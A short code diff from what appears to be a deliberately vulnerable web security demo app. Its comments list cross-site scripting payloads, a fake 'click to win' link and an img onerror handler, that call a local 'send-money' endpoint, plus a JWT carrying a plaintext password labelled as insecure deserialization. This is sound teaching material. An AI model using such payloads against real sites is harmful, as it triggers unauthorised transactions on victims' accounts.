@@ -6,8 +6,8 @@ import './Form.css';
 
 // res.setHeader("Content-Security-Policy", "script-src http://localhost3000");
 // no inline 
-// http://localhost:3000/?default=<a href="#" onclick="fetch('http://localhost:5000/api/vulnerable/send-money').then(x => x.json()).then(x => console.log('hfhgfhgf', x))"> click to win $$$$$$</a>
-// http://localhost:3000/?default=<img src onerror="fetch('http://localhost:5000/api/vulnerable/send-money').then(x => x.json()).then(x => console.log('hfhgfhgf', x))" />
+// http://localhost:3000/?default=<a href="#" onclick="fetch('http://localhost:5000/api/vulnerable/send-money').then(x => x.json()).then(x => console.log(x))"> click to win $$$$$$</a>
+// http://localhost:3000/?default=<img src onerror="fetch('http://localhost:5000/api/vulnerable/send-money').then(x => x.json()).then(x => console.log(x))" />
 
 // insecure deserialization
 // eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyTmFtZSI6IkphY2siLCJwYXNzd29yZCI6IkxvbmRvbiIsImlhdCI6MTYwNzUzOTgzM30.1KWediN-jfcXw_6sfFgfT3pyG17-rE_N0sz55O_aDpo
